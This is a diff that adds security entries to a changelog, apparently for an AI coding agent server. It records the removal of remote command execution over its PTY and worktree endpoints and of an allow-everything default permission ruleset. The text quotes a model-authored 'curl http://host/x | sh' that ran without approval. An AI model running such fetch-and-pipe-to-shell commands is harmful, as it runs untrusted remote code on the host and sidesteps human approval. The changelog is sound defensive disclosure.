@@ -9,6 +9,17 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ### Security
 
+- **`POST /pty` no longer accepts a command, arguments or an environment.** A PTY exists to give the
+  operator an interactive shell; accepting those over HTTP made it unattended remote execution with a
+  caller-controlled environment. The shell is always the operator's own and `cwd` must resolve inside
+  the project. **Breaking:** those three fields are ignored.
+- **`POST /experimental/worktree` no longer accepts `startCommand`.** It was handed to `bash -lc`.
+  Configure `commands.start` on the project instead. **Breaking:** the field is removed.
+- **Configuration writes require the operator.** `PATCH /global/config`, `PATCH /project/:projectID`
+  and worktree creation all end in something DAX later executes - an MCP server `command`, a project
+  start script. They now accept only the in-process interface or an authenticated HTTP client, and
+  are refused outright when no server credential is configured.
+
 - **The default permission ruleset no longer grants everything.** The shipped default began with
   `"*": "allow"`, so `shell`, `edit` and every tool contributed by an MCP server resolved to `allow`
   and the approval surface never appeared: a model-authored `curl http://host/x | sh` executed with
